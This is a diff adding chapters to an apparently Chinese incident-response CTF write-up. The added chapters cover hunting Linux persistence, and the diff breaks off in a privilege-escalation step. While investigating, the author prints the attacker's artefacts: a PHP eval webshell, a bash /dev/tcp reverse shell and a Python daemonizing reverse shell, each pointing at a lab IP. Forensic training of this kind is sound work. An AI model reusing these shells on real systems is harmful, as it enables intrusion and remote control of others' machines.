@@ -320,6 +320,23 @@
         <li><a href="#5查看2023年8月03日8时这一个小时内有多少ip访问提交次数">5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</a></li>
       </ol>
     </li>
+    <li><a href="#第三章-权限维持-linux权限维持-隐藏">第三章 权限维持-linux权限维持-隐藏</a>
+      <ol>
+        <li><a href="#黑客隐藏的隐藏的文件-完整路径md5">黑客隐藏的隐藏的文件 完整路径md5</a></li>
+        <li><a href="#黑客隐藏的文件反弹shell的ip端口-ipport">黑客隐藏的文件反弹shell的ip+端口 {ip:port}</a></li>
+        <li><a href="#黑客提权所用的命令-完整路径的md5-flagmd5">黑客提权所用的命令 完整路径的md5 flag{md5}</a></li>
+        <li><a href="#黑客尝试注入恶意代码的工具完整路径md5">黑客尝试注入恶意代码的工具完整路径md5</a></li>
+        <li><a href="#使用命令运行-xxx-执行该文件--将查询的-exec-值-作为flag提交-flagxxxxxxxxx">使用命令运行 ./x.xx 执行该文件  将查询的 Exec****** 值 作为flag提交 flag{/xxx/xxx/xxx}</a></li>
+      </ol>
+    </li>
+    <li><a href="#第四章-windows实战-emlog">第四章 windows实战-emlog</a>
+      <ol>
+        <li><a href="#通过本地-pc-rdp到服务器并且找到黑客植入-shell将黑客植入-shell-的密码-作为-flag-提交">通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;</a></li>
+        <li><a href="#通过本地-pc-rdp到服务器并且分析黑客攻击成功的-ip-为多少将黑客-ip-作为-flag-提交">通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</a></li>
+        <li><a href="#通过本地-pc-rdp到服务器并且分析黑客的隐藏账户名称将黑客隐藏账户名称作为-flag-提交">通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;</a></li>
+        <li><a href="#通过本地-pc-rdp到服务器并且分析黑客的挖矿程序的矿池域名将黑客挖矿程序的矿池域名称作为仅域名flag-提交">通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -396,7 +413,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 15 分钟
+                    阅读时长: 19 分钟
                 </time>
             </div>
         
@@ -2077,6 +2094,564 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{5}
 </span></span></code></pre></td></tr></table>
 </div>
+</div><h2 id="第三章-权限维持-linux权限维持-隐藏">第三章 权限维持-linux权限维持-隐藏
+</h2><h3 id="黑客隐藏的隐藏的文件-完整路径md5">黑客隐藏的隐藏的文件 完整路径md5
+</h3><p>先排查web目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:~# ls -alih /var/www/html
+</span></span><span class="line"><span class="cl">total 508K
+</span></span><span class="line"><span class="cl"><span class="m">43807940</span> drwxrwxrwx. <span class="m">1</span> www-data www-data   <span class="m">99</span> Aug  <span class="m">1</span>  <span class="m">2023</span> .
+</span></span><span class="line"><span class="cl"><span class="m">33813010</span> drwxr-xr-x. <span class="m">1</span> root     root       <span class="m">18</span> Jul <span class="m">31</span>  <span class="m">2023</span> ..
+</span></span><span class="line"><span class="cl"><span class="m">33811524</span> -rwxrwxrwx. <span class="m">1</span> www-data www-data 8.2K Jul <span class="m">20</span>  <span class="m">2023</span> Writenote.php
+</span></span><span class="line"><span class="cl"><span class="m">43807941</span> -rw-r--r--. <span class="m">1</span> www-data www-data 473K Aug  <span class="m">1</span>  <span class="m">2023</span> adminer.php
+</span></span><span class="line"><span class="cl"><span class="m">33811525</span> -rwxrwxrwx. <span class="m">1</span> www-data www-data  <span class="m">124</span> Jul <span class="m">20</span>  <span class="m">2023</span> common.php
+</span></span><span class="line"><span class="cl"><span class="m">43797312</span> drwxrwxrwx. <span class="m">1</span> www-data www-data   <span class="m">79</span> Jul <span class="m">20</span>  <span class="m">2023</span> css
+</span></span><span class="line"><span class="cl"><span class="m">51371096</span> drwxrwxrwx. <span class="m">1</span> www-data www-data   <span class="m">39</span> Jul <span class="m">20</span>  <span class="m">2023</span> images
+</span></span><span class="line"><span class="cl"><span class="m">33811526</span> -rwxrwxrwx. <span class="m">1</span> www-data www-data 2.6K Jul <span class="m">20</span>  <span class="m">2023</span> index.php
+</span></span><span class="line"><span class="cl"><span class="m">60152836</span> drwxrwxrwx. <span class="m">1</span> www-data www-data  <span class="m">104</span> Jul <span class="m">20</span>  <span class="m">2023</span> js
+</span></span><span class="line"><span class="cl"><span class="m">33811527</span> -rwxrwxrwx. <span class="m">1</span> root     root        <span class="m">0</span> Jul <span class="m">31</span>  <span class="m">2023</span> log.php
+</span></span><span class="line"><span class="cl"><span class="m">33811528</span> -rwxrwxrwx. <span class="m">1</span> www-data www-data 7.9K Jul <span class="m">20</span>  <span class="m">2023</span> search.php
+</span></span><span class="line"><span class="cl"><span class="m">43807942</span> -rw-rw-rw-. <span class="m">1</span> mysql    mysql      <span class="m">73</span> Aug  <span class="m">1</span>  <span class="m">2023</span> sh.php
+</span></span><span class="line"><span class="cl"><span class="m">43807943</span> -rw-rw-rw-. <span class="m">1</span> mysql    mysql       <span class="m">0</span> Aug  <span class="m">1</span>  <span class="m">2023</span> tmpubzil.php
+</span></span><span class="line"><span class="cl"><span class="m">43807944</span> -rw-rw-rw-. <span class="m">1</span> mysql    mysql       <span class="m">0</span> Aug  <span class="m">1</span>  <span class="m">2023</span> tmputsrv.php
+</span></span><span class="line"><span class="cl"><span class="m">43807945</span> -rw-rw-rw-. <span class="m">1</span> mysql    mysql       <span class="m">0</span> Aug  <span class="m">1</span>  <span class="m">2023</span> tmpuvdzm.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后查看后门</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/var/www/html# grep -rnw *.php -e <span class="s2">&#34;eval&#34;</span>
+</span></span><span class="line"><span class="cl">sh.php:1:1      <span class="m">2</span>       &lt;?php @eval<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;a&#39;</span><span class="o">])</span><span class="p">;</span>?&gt;     <span class="m">4</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看日志</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/var/log/apache2# cat access.log <span class="p">|</span>grep -e <span class="s2">&#34;sh.php&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:02:31 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">461</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:05:14 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">461</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:21.0.0) Gecko/20121011 Firefox/21.0.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:05:16 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">349</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:05:29 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">2840</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; fr-fr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:05:36 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">2920</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:05:38 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">392</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:05:52 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">314</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:05:54 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">315</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:06:18 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">429</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:06:20 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">374</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/5.0 Opera 11.11&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:06:31 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">317</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:06:33 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">220</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; fr-fr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:06:34 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">428</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:07:28 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">463</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:07:30 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">206</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Windows; U; Windows NT 6.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:07:31 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">474</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:08:17 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">332</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:08:20 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">245</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:17:05 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">416</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:17:09 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">470</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01&#34;</span>
+</span></span><span class="line"><span class="cl">192.168.200.2 - - <span class="o">[</span>01/Aug/2023:02:17:10 +0000<span class="o">]</span> <span class="s2">&#34;POST /sh.php HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">209</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现都不是，查看tmp目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/tmp# ls -alih
+</span></span><span class="line"><span class="cl">total 32K
+</span></span><span class="line"><span class="cl"><span class="m">25402596</span> drwxrwxrwt. <span class="m">1</span> root  root  16K Nov <span class="m">10</span> 06:46 .
+</span></span><span class="line"><span class="cl"><span class="m">46604697</span> drwxr-xr-x. <span class="m">1</span> root  root   <span class="m">85</span> Nov <span class="m">10</span> 06:46 ..
+</span></span><span class="line"><span class="cl"><span class="m">33813034</span> drwxr-xr-x. <span class="m">3</span> root  root   <span class="m">29</span> Aug  <span class="m">3</span>  <span class="m">2023</span> .temp
+</span></span><span class="line"><span class="cl"><span class="m">60152850</span> -rw-rw----. <span class="m">1</span> mysql mysql  <span class="m">42</span> Aug  <span class="m">1</span>  <span class="m">2023</span> 1.sh
+</span></span><span class="line"><span class="cl"><span class="m">35560619</span> -rw-------. <span class="m">1</span> root  root  <span class="m">174</span> Nov <span class="m">10</span> 06:46 apache2-stderr---supervisor-arYxBe.log
+</span></span><span class="line"><span class="cl"><span class="m">35560618</span> -rw-------. <span class="m">1</span> root  root    <span class="m">0</span> Nov <span class="m">10</span> 06:46 apache2-stdout---supervisor-vZ8AwR.log
+</span></span><span class="line"><span class="cl"><span class="m">35560621</span> -rw-------. <span class="m">1</span> root  root  <span class="m">155</span> Nov <span class="m">10</span> 06:46 mysql-stderr---supervisor-axT6Kp.log
+</span></span><span class="line"><span class="cl"><span class="m">35560620</span> -rw-------. <span class="m">1</span> root  root  <span class="m">153</span> Nov <span class="m">10</span> 06:46 mysql-stdout---supervisor-w3H9Bl.log
+</span></span><span class="line"><span class="cl"><span class="m">35560623</span> -rw-------. <span class="m">1</span> root  root    <span class="m">0</span> Nov <span class="m">10</span> 06:46 ssh-stderr---supervisor-SHoKbA.log
+</span></span><span class="line"><span class="cl"><span class="m">35560622</span> -rw-------. <span class="m">1</span> root  root    <span class="m">0</span> Nov <span class="m">10</span> 06:46 ssh-stdout---supervisor-F2oWBr.log
+</span></span><span class="line"><span class="cl"><span class="m">35560624</span> srwx------. <span class="m">1</span> root  root    <span class="m">0</span> Nov <span class="m">10</span> 06:46 supervisor.sock
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>1.sh非常可疑我们看一下</p>
+<p>有个反弹shell的代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/tmp# cat 1.sh
+</span></span><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span>/dev/tcp/192.168.100.13/777 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是这个不是隐藏文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/tmp/.temp/libprocesshider# ls -alih
+</span></span><span class="line"><span class="cl">total 24K
+</span></span><span class="line"><span class="cl"><span class="m">43807955</span> drwxr-xr-x. <span class="m">3</span> root root  <span class="m">119</span> Aug  <span class="m">3</span>  <span class="m">2023</span> .
+</span></span><span class="line"><span class="cl"><span class="m">33813034</span> drwxr-xr-x. <span class="m">3</span> root root   <span class="m">29</span> Aug  <span class="m">3</span>  <span class="m">2023</span> ..
+</span></span><span class="line"><span class="cl"><span class="m">51380996</span> drwxr-xr-x. <span class="m">8</span> root root  <span class="m">163</span> Aug  <span class="m">3</span>  <span class="m">2023</span> .git
+</span></span><span class="line"><span class="cl"><span class="m">43807964</span> -rw-r--r--. <span class="m">1</span> root root   <span class="m">20</span> Aug  <span class="m">3</span>  <span class="m">2023</span> .gitignore
+</span></span><span class="line"><span class="cl"><span class="m">43807965</span> -rwxr-xr-x. <span class="m">1</span> root root  <span class="m">826</span> Aug  <span class="m">3</span>  <span class="m">2023</span> 1.py
+</span></span><span class="line"><span class="cl"><span class="m">43807966</span> -rw-r--r--. <span class="m">1</span> root root  <span class="m">168</span> Aug  <span class="m">3</span>  <span class="m">2023</span> Makefile
+</span></span><span class="line"><span class="cl"><span class="m">43807967</span> -rw-r--r--. <span class="m">1</span> root root 2.9K Aug  <span class="m">3</span>  <span class="m">2023</span> README.md
+</span></span><span class="line"><span class="cl"><span class="m">43807968</span> -rw-r--r--. <span class="m">1</span> root root 3.4K Aug  <span class="m">3</span>  <span class="m">2023</span> processhider.c
+</span></span><span class="line"><span class="cl"><span class="m">43807969</span> -rw-r--r--. <span class="m">1</span> root root  <span class="m">243</span> Aug  <span class="m">3</span>  <span class="m">2023</span> shell.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看1.py和shell.py</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@xuanji:/tmp/.temp/libprocesshider# cat 1.py
+</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">import socket,subprocess,os,sys, <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">pidrg</span> <span class="o">=</span> os.fork<span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> pidrg &gt; 0:
+</span></span><span class="line"><span class="cl">        sys.exit<span class="o">(</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">os.chdir<span class="o">(</span><span class="s2">&#34;/&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">os.setsid<span class="o">()</span>
+</span></span><span class="line"><span class="cl">os.umask<span class="o">(</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">drgpid</span> <span class="o">=</span> os.fork<span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> drgpid &gt; 0:
+</span></span><span class="line"><span class="cl">        sys.exit<span class="o">(</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> 1:
+</span></span><span class="line"><span class="cl">        try:
+</span></span><span class="line"><span class="cl">                sys.stdout.flush<span class="o">()</span>
+</span></span><span class="line"><span class="cl">                sys.stderr.flush<span class="o">()</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">fdreg</span> <span class="o">=</span> open<span class="o">(</span><span class="s2">&#34;/dev/null&#34;</span>, <span class="s2">&#34;w&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">                sys.stdout <span class="o">=</span> fdreg
+</span></span><span class="line"><span class="cl">                sys.stderr <span class="o">=</span> fdreg
+</span></span><span class="line"><span class="cl">                <span class="nv">sdregs</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                sdregs.connect<span class="o">((</span><span class="s2">&#34;114.114.114.121&#34;</span>,9999<span class="o">))</span>
+</span></span><span class="line"><span class="cl">                os.dup2<span class="o">(</span>sdregs.fileno<span class="o">()</span>,0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                os.dup2<span class="o">(</span>sdregs.fileno<span class="o">()</span>,1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                os.dup2<span class="o">(</span>sdregs.fileno<span class="o">()</span>,2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">p</span><span class="o">=</span>subprocess.call<span class="o">([</span><span class="s2">&#34;/bin/bash&#34;</span>,<span class="s2">&#34;-i&#34;</span><span class="o">])</span>
+</span></span><span class="line"><span class="cl">                sdregs.close<span class="o">()</span>
+</span></span><span class="line"><span class="cl">        except Exception:
+</span></span><span class="line"><span class="cl">                pass
+</span></span><span class="line"><span class="cl">        time.sleep<span class="o">(</span>2<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>1.py有可执行权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/tmp/.temp/libprocesshider/1.py --&gt; 109ccb5768c70638e24fb46ee7957e37
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{109ccb5768c70638e24fb46ee7957e37}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="黑客隐藏的文件反弹shell的ip端口-ipport">黑客隐藏的文件反弹shell的ip+端口 {ip:port}
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{114.114.114.121:9999}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="黑客提权所用的命令-完整路径的md5-flagmd5">黑客提权所用的命令 完整路径的md5 flag{md5}
+</h3><p>查看suid</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
